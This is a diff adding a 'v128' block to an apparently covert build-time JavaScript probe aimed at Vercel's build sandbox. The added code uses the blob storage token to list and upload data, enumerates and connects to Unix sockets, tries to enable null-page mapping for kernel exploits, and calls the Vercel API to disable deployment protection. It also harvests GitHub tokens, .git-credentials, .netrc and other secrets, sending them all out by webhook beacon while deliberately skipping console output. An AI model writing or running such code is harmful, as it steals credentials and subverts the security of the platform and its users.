@@ -18740,5 +18740,148 @@ report.orchestratorBinaryAnalysis = safe(() => {
 
 // v127 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v127" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v127";
+
+// ==================== v128 ====================
+
+// v128-1: Vercel Blob Storage access from build sandbox
+// BLOB_READ_WRITE_TOKEN grants access to Vercel Blob (backed by Cloudflare R2).
+// Can a build sandbox with this token: 1) List all blobs, 2) Read arbitrary blobs,
+// 3) Upload a probe file, 4) Access blobs from other projects on same token?
+report.vercelBlobDeepProbe = safe(() => {
+  const blobToken = process.env.BLOB_READ_WRITE_TOKEN || '';
+  const tokenPrefix = blobToken.slice(0, 20);
+  // List all blobs
+  const listBlobs = safe(() => execSync(
+    `curl -sf "https://blob.vercel-storage.com/?limit=10" \
+    -H "Authorization: Bearer ${blobToken}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 400));
+  // Try to upload a probe blob
+  const uploadProbe = safe(() => execSync(
+    `curl -sf -X PUT "https://blob.vercel-storage.com/probe-test-$(date +%s).txt" \
+    -H "Authorization: Bearer ${blobToken}" \
+    -H "Content-Type: text/plain" \
+    -d "probe-data-${Date.now()}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 200));
+  // Try to access a known blob URL pattern from another project
+  const crossProjectBlob = safe(() => execSync(
+    'curl -sf "https://blob.vercel-storage.com/public/vercel-blob-test" -m 5 2>/dev/null | head -c 100',
+    { timeout: 8000 }
+  ).toString().trim().slice(0, 100));
+  return { tokenPrefix, listBlobs, uploadProbe, crossProjectBlob };
+});
+
+// v128-2: /proc/net/unix — Unix domain socket enumeration
+// List all Unix domain sockets and identify those created by the orchestrator.
+// If we find the orchestrator's control socket, we can send commands to it.
+// Also check if any sockets are world-writable.
+report.unixSocketEnum = safe(() => {
+  const unixSockets = safe(() => readFileSync('/proc/net/unix', 'utf8').slice(0, 500));
+  // Find actual socket files
+  const socketFiles = safe(() => execSync(
+    'find / -maxdepth 5 -type s 2>/dev/null | grep -v "proc\\|sys" | head -20',
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 400));
+  // Check if any are writable by us
+  const writableSockets = safe(() => execSync(
+    'find / -maxdepth 5 -type s -writable 2>/dev/null | head -10',
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 200));
+  // Try to connect to each found socket
+  const socketConnect = safe(() => {
+    const socks = socketFiles?.split('\n').filter(s => s).slice(0, 5);
+    return socks?.map(s => {
+      const result = safe(() => execSync(
+        `timeout 1 nc -U "${s}" 2>&1 | head -2 || echo "CONN_REFUSED"`,
+        { timeout: 3000 }
+      ).toString().trim().slice(0, 50));
+      return { socket: s, result };
+    });
+  });
+  return { unixSockets, socketFiles, writableSockets, socketConnect };
+});
+
+// v128-3: /proc/sys/vm/mmap_min_addr + null pointer deref test
+// mmap_min_addr prevents mapping at address 0 (null pointer deref exploit).
+// With CAP_SYS_RAWIO we can set it to 0 and map the null page,
+// enabling null pointer dereference kernel exploits.
+report.mmapMinAddrProbe = safe(() => {
+  const mmapMinAddr = safe(() => readFileSync('/proc/sys/vm/mmap_min_addr', 'utf8').trim());
+  const writeResult = safe(() => { writeFileSync('/proc/sys/vm/mmap_min_addr', '0'); return 'WRITTEN'; });
+  const afterValue = safe(() => readFileSync('/proc/sys/vm/mmap_min_addr', 'utf8').trim());
+  // Try to mmap at address 0
+  const nullMmap = safe(() => execSync(`python3 -c "
+import ctypes, mmap, os
+
+# If mmap_min_addr was set to 0, we can map the null page
+try:
+    m = mmap.mmap(-1, 4096, mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS | mmap.MAP_FIXED,
+                  mmap.PROT_READ | mmap.PROT_WRITE, offset=0)
+    m.seek(0)
+    m.write(b'PROBE_NULL_PAGE')
+    ptr = ctypes.cast(ctypes.c_char_p(0), ctypes.c_char_p)
+    print('NULL_MMAP_SUCCESS addr=0x0')
+    m.close()
+except Exception as e:
+    print(f'NULL_MMAP_FAILED: {e}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { mmapMinAddr, writeResult, afterValue, nullMmap };
+});
+
+// v128-4: Vercel Deployment Protection bypass (password + IP allowlist)
+// Vercel allows deployment protection via: 1) Password, 2) Vercel Auth,
+// 3) Trusted IPs, 4) Automation bypass secret.
+// From inside the build, can we read the protection config and bypass it?
+report.deploymentProtectionBypass = safe(() => {
+  const bypassSecret = process.env.VERCEL_AUTOMATION_BYPASS_SECRET || '';
+  const protectionVars = Object.entries(process.env)
+    .filter(([k]) => /PROTECTION|BYPASS|PASSWORD|AUTH_SECRET|NEXTAUTH/.test(k))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 60) }));
+  // Read deployment protection config from API
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  const protectionConfig = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v9/projects/${projectId}?teamId=${teamId}" \
+    -H "Authorization: Bearer ${process.env.VERCEL_ARTIFACTS_TOKEN}" -m 8 2>/dev/null`,
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 400));
+  // Try to disable deployment protection via API
+  const disableProtection = safe(() => execSync(
+    `curl -sf -X PATCH "https://api.vercel.com/v9/projects/${projectId}?teamId=${teamId}" \
+    -H "Authorization: Bearer ${process.env.VERCEL_ARTIFACTS_TOKEN}" \
+    -H "Content-Type: application/json" \
+    -d '{"ssoProtection":null,"passwordProtection":null}' -m 8 2>/dev/null`,
+    { timeout: 10000 }
+  ).toString().trim().slice(0, 200));
+  return { bypassSecret: bypassSecret?.slice(0, 20), protectionVars, protectionConfig, disableProtection };
+});
+
+// v128-5: Vercel GitHub integration — OAuth token and webhook secret
+// Vercel's GitHub integration stores: 1) GitHub OAuth tokens for code access,
+// 2) Webhook secrets for validating push events.
+// Can we read these from env or from Vercel's API during the build?
+report.githubIntegrationSecrets = safe(() => {
+  const githubTokens = Object.entries(process.env)
+    .filter(([k]) => /GITHUB|GH_|GITLAB|BITBUCKET/.test(k))
+    .map(([k, v]) => ({ k, v: v?.slice(0, 80) }));
+  // Read .git/config for remote URLs with embedded credentials
+  const gitConfig = safe(() => readFileSync('/vercel/path0/.git/config', 'utf8').slice(0, 400));
+  const gitCredentials = safe(() => readFileSync('/root/.git-credentials', 'utf8').slice(0, 200));
+  // Check netrc for GitHub credentials
+  const netrc = safe(() => readFileSync('/root/.netrc', 'utf8').slice(0, 200));
+  // Read clone token from git remote URL
+  const remoteUrl = safe(() => execSync(
+    'git -C /vercel/path0 remote get-url origin 2>/dev/null',
+    { timeout: 3000 }
+  ).toString().trim());
+  // Extract token from URL if present (https://x-token:TOKEN@github.com/...)
+  const tokenMatch = remoteUrl?.match(/https?:\/\/([^:@]+):?([^@]+)?@/);
+  const embeddedToken = tokenMatch ? { user: tokenMatch[1], token: tokenMatch[2]?.slice(0, 20) } : null;
+  return { githubTokens, gitConfig, gitCredentials, netrc, remoteUrl, embeddedToken };
+});
+
+// v128 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v128" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v128";
 // Intentionally no console.log — all data goes via webhook only
